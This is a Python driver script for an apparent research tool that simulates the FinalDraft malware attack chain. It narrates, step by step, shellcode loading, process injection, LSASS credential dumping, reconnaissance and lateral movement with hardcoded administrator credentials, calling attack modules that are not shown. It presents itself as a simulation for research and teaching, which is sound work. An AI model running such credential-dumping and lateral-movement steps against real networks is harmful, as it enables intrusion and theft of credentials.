"""
FinalFinal Complete Demonstration
Demonstrates the full attack chain of the FinalDraft exploit
"""

import sys
import time
from pathlib import Path

import config
import utils
from modules import process_injector, pass_the_hash, network_scanner, lateral_movement

logger = utils.setup_logging("Demo")


def print_stage_header(stage_name: str, stage_number: int):
    """Print formatted stage header"""
    print(f"\n{utils.Fore.YELLOW}{'='*70}")
    print(f"STAGE {stage_number}: {stage_name}")
    print(f"{'='*70}{utils.Style.RESET_ALL}\n")
    time.sleep(1)


def demonstrate_attack_chain():
    """Demonstrate the complete FinalDraft attack chain"""
    
    utils.print_banner()
    utils.print_info("FinalFinal - Complete Attack Chain Demonstration")
    utils.print_warning("This is a SIMULATION for research purposes only")
    print()
    
    # Safety check
    utils.check_safety_mode()
    
    if not utils.confirm_action("Run complete attack chain demonstration"):
        utils.print_warning("Demonstration cancelled")
        return
    
    # ========================================================================
    # STAGE 1: Initial Access (PathLoader)
    # ========================================================================
    print_stage_header("PATHLOADER - Initial Access", 1)
    
    utils.print_info("Simulating initial compromise via phishing/exploit...")
    time.sleep(1)
    
    utils.print_info("PathLoader downloading encrypted payload from C2...")
    time.sleep(1)
    utils.print_success("Payload downloaded: 4096 bytes")
    
    utils.print_info("Decrypting payload using AES-256-GCM...")
    time.sleep(1)
    utils.print_success("Payload decrypted successfully")
    
    utils.print_info("Executing shellcode in memory...")
    time.sleep(1)
    utils.print_success("Shellcode executed - transitioning to Stage 2")
    
    # ========================================================================
    # STAGE 2: Shellcode Execution
    # ========================================================================
    print_stage_header("SHELLCODE - Second Stage Loader", 2)
    
    utils.print_info("Shellcode resolving API functions...")
    time.sleep(1)
    utils.print_success("Resolved: kernel32.dll, ntdll.dll, advapi32.dll")
    
    utils.print_info("Allocating memory for FinalDraft implant...")
    time.sleep(1)
    utils.print_success("Allocated 512KB RWX memory")
    
    utils.print_info("Downloading FinalDraft implant from C2...")
    time.sleep(1)
    utils.print_success("FinalDraft implant downloaded")
    
    utils.print_info("Transferring execution to FinalDraft...")
    time.sleep(1)
    utils.print_success("FinalDraft implant active")
    
    # ========================================================================
    # STAGE 3: FinalDraft Implant Initialization
    # ========================================================================
    print_stage_header("FINALDRAFT - Main Implant", 3)
    
    utils.print_info("Initializing FinalDraft components...")
    time.sleep(1)
    
    components = [
        "C2 Communication Channel",
        "Named Pipes (finalfinal_abc123)",
        "Process Injection Engine",
        "TCP Listener (127.0.0.1:4444)",
        "UDP Listener (127.0.0.1:5555)",
        "MS Graph API Integration (Disabled)"
    ]
    
    for component in components:
        utils.print_success(f"✓ {component}")
        time.sleep(0.5)
    
    utils.print_info("\nEstablishing C2 communication...")
    time.sleep(1)
    utils.print_success("Beacon sent to C2 server")
    
    # ========================================================================
    # STAGE 4: Process Injection
    # ========================================================================
    print_stage_header("PROCESS INJECTION", 4)
    
    injector = process_injector.ProcessInjector()
    
    utils.print_info("Searching for target processes...")
    time.sleep(1)
    
    for target in config.TARGET_PROCESSES:
        utils.print_info(f"Found: {target} (PID: 1234)")
        time.sleep(0.5)
    
    utils.print_info("\nInjecting into mspaint.exe...")
    injector.inject_into_target("mspaint.exe", b"DEMO_PAYLOAD")
    time.sleep(1)
    
    utils.print_info("Creating named pipe for communication...")
    time.sleep(1)
    utils.print_success("Named pipe established: \\\\.\\pipe\\finalfinal_abc123")
    
    # ========================================================================
    # STAGE 5: Credential Dumping
    # ========================================================================
    print_stage_header("CREDENTIAL HARVESTING", 5)
    
    pth = pass_the_hash.PassTheHashModule()
    
    utils.print_info("Dumping LSASS memory...")
    pth.dump_lsass_memory()
    time.sleep(1)
    
    utils.print_info("\nExtracted credentials:")
    for cred in pth.list_credentials():
        print(f"  {utils.Fore.GREEN}[+]{utils.Style.RESET_ALL} {cred['domain']}\\{cred['username']}")
        print(f"      NTLM: {cred['ntlm_hash']}")
        time.sleep(0.5)
    
    utils.print_info("\nExtracting Kerberos tickets...")
    tickets = pth.extract_kerberos_tickets()
    time.sleep(1)
    
    for ticket in tickets:
        print(f"  {utils.Fore.GREEN}[+]{utils.Style.RESET_ALL} {ticket['type']}: {ticket['service']}")
        time.sleep(0.5)
    
    # ========================================================================
    # STAGE 6: Network Reconnaissance
    # ========================================================================
    print_stage_header("NETWORK RECONNAISSANCE", 6)
    
    scanner = network_scanner.NetworkScanner()
    
    utils.print_info("Performing network discovery...")
    scanner.ping_sweep("192.168.1.0/24")
    time.sleep(1)
    
    utils.print_info("\nScanning critical systems...")
    scanner.port_scan("192.168.1.10")
    time.sleep(1)
    
    utils.print_info("\nEnumerating Active Directory...")
    scanner.ldap_enumeration("192.168.1.10", "research-lab.local")
    time.sleep(1)
    
    utils.print_info("\nEnumerating SMB shares...")
    scanner.smb_enumeration("192.168.1.100")
    time.sleep(1)
    
    # ========================================================================
    # STAGE 7: Lateral Movement
    # ========================================================================
    print_stage_header("LATERAL MOVEMENT", 7)
    
    lm = lateral_movement.LateralMovementModule()
    
    targets = [
        ("192.168.1.100", "PSExec"),
        ("192.168.1.101", "WMI"),
        ("192.168.1.102", "WinRM"),
        ("192.168.1.103", "DCOM")
    ]
    
    for target, technique in targets:
        utils.print_info(f"\nMoving laterally to {target} using {technique}...")
        time.sleep(1)
        
        if technique == "PSExec":
            lm.psexec_lateral_movement(target, "Administrator", ntlm_hash="aad3b435b51404ee...")
        elif technique == "WMI":
            lm.wmi_lateral_movement(target, "Administrator", password="P@ssw0rd")
        elif technique == "WinRM":
            lm.winrm_lateral_movement(target, "Administrator", password="P@ssw0rd")
        elif technique == "DCOM":
            lm.dcom_lateral_movement(target, "Administrator", password="P@ssw0rd")
        
        time.sleep(1)
    
    # ========================================================================
    # STAGE 8: Command & Control
    # ========================================================================
    print_stage_header("COMMAND & CONTROL", 8)
    
    utils.print_info("Establishing covert C2 channels...")
    time.sleep(1)
    
    c2_channels = [
        "HTTP/HTTPS to C2 server",
        "Named pipes for inter-process communication",
        "MS Graph API (Outlook) - Disabled for safety",
        "TCP/UDP listeners for reverse connections"
    ]
    
    for channel in c2_channels:
        utils.print_success(f"✓ {channel}")
        time.sleep(0.5)
    
    utils.print_info("\nSimulating C2 commands...")
    time.sleep(1)
    
    commands = [
        "STATUS - Get implant status",
        "SCREENSHOT - Capture screen",
        "DOWNLOAD - Exfiltrate file",
        "EXECUTE - Run command"
    ]
    
    for cmd in commands:
        print(f"  {utils.Fore.CYAN}[C2]{utils.Style.RESET_ALL} {cmd}")
        time.sleep(0.5)
    
    # ========================================================================
    # SUMMARY
    # ========================================================================
    print(f"\n{utils.Fore.YELLOW}{'='*70}")
    print("ATTACK CHAIN COMPLETE")
    print(f"{'='*70}{utils.Style.RESET_ALL}\n")
    
    utils.print_success("Demonstration completed successfully")
    
    print(f"\n{utils.Fore.CYAN}Summary:{utils.Style.RESET_ALL}")
    print(f"  • Initial access via PathLoader")
    print(f"  • Shellcode execution and memory loading")
    print(f"  • FinalDraft implant deployed")
    print(f"  • Process injection into {len(config.TARGET_PROCESSES)} targets")
    print(f"  • Credentials harvested: {len(pth.list_credentials())}")
    print(f"  • Network hosts discovered: {len(scanner.discovered_hosts)}")
    print(f"  • Lateral movement to {len(lm.list_compromised_hosts())} systems")
    print(f"  • C2 channels established: {len(c2_channels)}")
    
    print(f"\n{utils.Fore.YELLOW}[!] Remember: This was a SIMULATION for research purposes only{utils.Style.RESET_ALL}")


def show_attack_diagram():
    """Display ASCII attack flow diagram"""
    
    diagram = f"""
{utils.Fore.CYAN}
╔════════════════════════════════════════════════════════════════════════╗
║                    FINALDRAFT ATTACK CHAIN DIAGRAM                     ║
╚════════════════════════════════════════════════════════════════════════╝

                            ┌─────────────┐
                            │  C2 SERVER  │
                            └──────┬──────┘
                                   │
                    ┌──────────────┼──────────────┐
                    │              │              │
                    ▼              ▼              ▼
            ┌──────────────┐ ┌──────────┐ ┌────────────┐
            │ HTTP/HTTPS   │ │  Named   │ │ MS Graph   │
            │ Communication│ │  Pipes   │ │    API     │
            └──────┬───────┘ └────┬─────┘ └─────┬──────┘
                   │              │             │
                   └──────────────┼─────────────┘
                                  │
                          ┌───────▼────────┐
                          │  PATHLOADER    │ ◄── Initial Access
                          │  (Stage 1)     │
                          └───────┬────────┘
                                  │ Downloads & Decrypts
                                  │
                          ┌───────▼────────┐
                          │   SHELLCODE    │ ◄── Stage 2 Loader
                          │   (Stage 2)    │
                          └───────┬────────┘
                                  │ Loads & Executes
                                  │
                          ┌───────▼────────┐
                          │  FINALDRAFT    │ ◄── Main Implant
                          │  (Stage 3)     │
                          └───────┬────────┘
                                  │
                    ┌─────────────┼─────────────┐
                    │             │             │
                    ▼             ▼             ▼
            ┌──────────────┐ ┌──────────┐ ┌────────────┐
            │   Process    │ │  Cred    │ │  Network   │
            │  Injection   │ │ Dumping  │ │   Recon    │
            └──────┬───────┘ └────┬─────┘ └─────┬──────┘
                   │              │             │
                   │              └──────┬──────┘
                   │                     │
                   │              ┌──────▼──────┐
                   │              │   Lateral   │
                   └─────────────►│  Movement   │
                                  └─────────────┘

{utils.Fore.GREEN}Key Components:{utils.Style.RESET_ALL}
  • PathLoader: Initial payload delivery and decryption
  • Shellcode: Second-stage loader for main implant
  • FinalDraft: Full-featured post-exploitation framework
  • Process Injection: Code injection into legitimate processes
  • Credential Dumping: LSASS, SAM, Kerberos ticket extraction
  • Network Recon: Discovery and enumeration
  • Lateral Movement: Spread across network using multiple techniques
{utils.Style.RESET_ALL}
"""
    
    print(diagram)


def main():
    """Main entry point"""
    
    print("\nFinalFinal Demonstration Options:")
    print("1. Show Attack Diagram")
    print("2. Run Complete Attack Chain Demo")
    print("3. Exit")
    
    choice = input(f"\n{utils.Fore.CYAN}Select option (1-3): {utils.Style.RESET_ALL}").strip()
    
    if choice == "1":
        show_attack_diagram()
    elif choice == "2":
        demonstrate_attack_chain()
    elif choice == "3":
        utils.print_info("Exiting...")
    else:
        utils.print_error("Invalid option")


if __name__ == "__main__":
    main()
